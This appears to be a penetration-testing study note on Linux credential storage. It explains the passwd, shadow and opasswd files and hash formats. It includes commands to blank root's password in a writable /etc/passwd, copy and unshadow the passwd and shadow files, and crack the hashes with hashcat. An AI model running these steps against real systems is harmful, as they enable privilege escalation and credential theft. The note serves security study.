# Linux Credential Storage
```table-of-contents
```
## The Passwd File (`/etc/passwd`)
**Format:** `root:x:0:0:root:/root:/bin/bash`

|Field|Value|Description|
|---|---|---|
|**Login Name**|`root`|Username used to log in.|
|**Password**|`x`|Indicates the hash is stored in `/etc/shadow`.|
|**UID**|`0`|User ID (0 is always root).|
|**GID**|`0`|Group ID.|
|**Comments**|`root`|Full name or metadata.|
|**Home**|`/root`|User's home directory.|
|**Shell**|`/bin/bash`|Default shell program.|
### Vulnerability: Writable `/etc/passwd`
```shell
# Original
root:x:0:0:root:/root:/bin/bash

# Modified (No password required for root)
root::0:0:root:/root:/bin/bash

# Exploit
su root
# (Press Enter when prompted for password)
```
## The Shadow File (`/etc/shadow`)
**Format:** `cry0l1t3:$6$wBRzy$...:18937:0:99999:7:::`

| **Field**                | **Description**                                                 |
| -------------------- | ----------------------------------------------------------- |
| `Username`           | The login name.                                             |
| `Encrypted Password` | The hash string (e.g., `$6$salt$hash`).                     |
| `Last Change`        | Days since Jan 1, 1970, that the password was last changed. |
| `Min Age`            | Minimum days before password can be changed.                |
| `Max Age`            | Maximum days before password must be changed.               |
| `Warning`            | Days before expiration to warn the user.                    |
| `Inactive`           | Days after expiration until account is disabled.            |
| `Expire`             | Date account expires (epoch).                               |
### Hash Format & Algorithms
| **Type**     | **Algorithm** | **Note**                      |
| -------- | --------- | ------------------------- |
| `$1$`    | MD5       | Old, easily crackable.    |
| `$2a/y$` | Blowfish  | Used in BSD/bcrypt.       |
| `$5$`    | SHA-256   | Stronger.                 |
| `$6$`    | SHA-512   | Standard on modern Linux. |
**Special Flags:**
- `*` or `!`: Account is locked or has no password set (cannot login via password, but SSH keys may still work).
## The Opasswd File (`/etc/security/opasswd`)
Used by PAM (`pam_unix.so`) to prevent password reuse. It stores a history of previous user passwords.
- **Requirement:** Root privileges to read.
- **Value:** Often contains older hashes using weaker algorithms (like MD5), which are easier to crack.
- **Strategy:** Crack these to identify the user's password patterns (e.g., `Summer2021!`, `Summer2022!`).
```shell
sudo cat /etc/security/opasswd
```
## Cracking Linux Hashes
### Step 1: Unshadow
```shell
# Copy files (if you can't run unshadow on target)
cp /etc/passwd /tmp/passwd.bak
cp /etc/shadow /tmp/shadow.bak

# Combine them
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
### Step 2: Crack with Hashcat
**Common Modes:**
- **MD5 (`$1$`)**: Mode `500` 
- **SHA-512 (`$6$`)**: Mode `1800`
```shell
# Cracking SHA-512 (Standard Linux)
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt

# Cracking MD5 (Legacy/opasswd)
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```